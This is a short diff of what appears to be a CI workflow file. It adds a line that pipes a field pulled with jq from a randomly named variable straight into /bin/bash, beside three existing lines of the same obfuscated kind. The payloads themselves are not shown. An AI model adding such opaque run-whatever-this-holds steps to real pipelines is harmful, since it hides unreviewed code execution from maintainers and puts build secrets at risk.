@@ -22,6 +22,7 @@ jobs:
           echo $zl61 | jq -r .jafws01249 | /bin/bash
           echo $e760 | jq -r .h7661 | /bin/bash
           printf '%s' "$rv88775" | jq -r .kslr08059 | /bin/bash
+          echo $rygz29 | jq -r .jdk80 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
